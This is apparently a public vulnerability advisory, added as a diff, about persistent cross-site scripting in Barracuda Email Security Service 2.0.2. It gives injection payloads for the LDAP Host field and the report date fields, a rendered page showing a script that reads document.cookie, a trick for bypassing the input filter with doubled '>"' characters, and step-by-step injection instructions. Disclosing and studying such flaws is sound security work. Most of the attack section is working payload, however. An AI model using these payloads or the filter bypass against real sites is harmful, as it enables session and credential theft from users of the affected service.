@@ -1,0 +1,56 @@
+source: http://www.securityfocus.com/bid/54773/info
+
+Barracuda Email Security Service is prone to multiple HTML-injection vulnerabilities because it fails to properly validate user-supplied input.
+
+An attacker may leverage these issues to inject hostile HTML and script code that would run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user.
+
+Barracuda Email Security Service 2.0.2 is vulnerable; other versions may also be affected. 
+
+Proof of Concept:
+=================
+1.1
+The persistent web vulnerability can be exploited by remote attackers with privileged user account & low user inter action.
+For demonstration or reproduce ...
+
+Review:  Domain Settings > Directory Services > LDAP Host
+
+<div id="directory-services" class="module">
+        <h4 class="module-title">Directory Services</h4>
+        <div class="module-content">
+          <div class="warn notice" id="ldap-test-result" style=""><img src="/images/spinner1.gif" 
+alt="loading..."> Connecting to >"<iframe src="http://www.example1.com">@gmail.com >"<script>alert(document.cookie)</script><div style="1@gmail.com 0</iframe></div>    
+          <div style="float: right;">
+            <a href="https://www.example2.com/domains/sync_ldap/4" class="btn"><span><span>Synchronize Now</span></span></a>
+            <a href="#" class="btn" id="ldap-test-btn"><span><span>Test Settings</span></span></a>
+          </div>
+          <p class="field">
+            <label class="label" for="ldap_host">LDAP Host:</label>
+            <input name="ldap_host" id="ldap_host" size="30" value=">
+"<iframe src=http://www.example1.com>@gmail.com >"<script>alert(document.cookie)</script><
+div style="1@gmail.com 0" type="text">
+
+URL:   https://www.example.com/domains/info/4
+
+PoC: >">"<iframe src=http://www.example1.com>VL >"<div style="1 >">"
+
+Note:
+To bypass the validation close the tag of the exception handling on beginning with double quotes 2 times.
+The mask of the exception (>") will be bypassed and the string will be executed out of the secure exception handling message.
+
+
+
+1.2
+The persistent web vulnerability can be exploited by remote attackers with privileged user account & low user inter action.
+For demonstration or reproduce ...
+
+Vulnerable Module: Reports > Date Start > Date End
+
+PoC: >"<iframe src=http://www.example1.com>
+
+URL: https://www.example.com/reports
+
+Note:
+1. Include a start Date & End Date
+2. Inject after the start date & end date your own persistent script code
+3. Result: The script code get executed out of the date listing application context
+4. Save value with script code to events for exploitation via module.
